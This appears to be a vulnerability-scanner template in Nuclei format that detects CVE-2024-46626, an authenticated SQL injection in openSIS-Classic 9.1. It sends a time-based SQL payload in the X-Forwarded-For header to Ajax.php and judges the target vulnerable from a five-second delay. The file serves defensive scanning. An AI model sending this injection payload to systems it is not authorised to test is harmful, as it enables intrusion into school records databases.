id: CVE-2024-46626
info:
  name: openSIS-Classic 9.1 - Authenticated SQL Injection via X-Forwarded-For Header
  author: Haliteroglu
  severity: high
  description: >
    Authenticated SQL Injection vulnerability in openSIS-Classic 9.1 via the X-Forwarded-For header in Ajax.php. 
    Allows execution of arbitrary SQL queries by authenticated users.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-46626
    - https://github.com/OS4ED/openSIS-Classic
  tags: cve,cve2024,sqli,authenticated,opensis
requests:
  - method: GET
    path:
      - "{{BaseURL}}/Ajax.php?modname=x"
    headers:
      X-Forwarded-For: "127.0.0.2' AND SLEEP(5)-- -"
      Cookie: "{{cookie}}"
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
    condition: and
    extractors:
      - type: dsl
        dsl:
          - "duration"

